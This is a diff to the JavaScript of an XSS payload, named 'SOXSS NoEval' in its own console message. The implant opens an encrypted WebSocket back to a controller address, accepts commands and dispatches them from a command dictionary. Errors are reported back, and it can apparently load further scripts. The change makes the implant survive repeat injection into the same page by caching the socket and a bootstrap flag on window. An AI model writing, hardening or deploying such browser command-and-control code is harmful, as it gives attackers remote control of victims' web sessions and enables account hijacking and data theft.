@@ -1,4 +1,8 @@
+var webSocket = window.__SOXSS_SOCKET_NOEVAL__ || null;
 function sendMessage(msg) {
+    if (!webSocket || webSocket.readyState !== 1) {
+        return;
+    }
     mes = JSON.stringify(msg)
     webSocket.send(encrypt(mes));
 }
@@ -29,10 +33,17 @@ function loadScript(script) {
     node.remove()
 }
 
-const webSocket = new WebSocket(wsBase);
-webSocket.onopen = (e) => {
-    sendMessage({ type: 1 });
-};
+if (window.__SOXSS_BOOTSTRAPPED__) {
+    console.info("SOXSS NoEval payload already active in this page context.");
+} else {
+    window.__SOXSS_BOOTSTRAPPED__ = true;
+    webSocket = new WebSocket(wsBase);
+    window.__SOXSS_SOCKET_NOEVAL__ = webSocket;
+
+    webSocket.onopen = (e) => {
+        sendMessage({ type: 1 });
+    };
+}
 
 /* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
 
@@ -63,14 +74,16 @@ var _webs_Commands_ = {
     }
 }
 
-webSocket.onmessage = (event) => {
-    try {
-        const output = hex2a(decrypt(event.data));
-        let mes = JSON.parse(output)
-        _webs_Commands_[mes["Command"]](mes)
-    } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }
+if (webSocket && !webSocket.onmessage) {
+    webSocket.onmessage = (event) => {
+        try {
+            const output = hex2a(decrypt(event.data));
+            let mes = JSON.parse(output)
+            _webs_Commands_[mes["Command"]](mes)
+        } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }
 
-};
+    };
+}
 
 
 // Criptografía
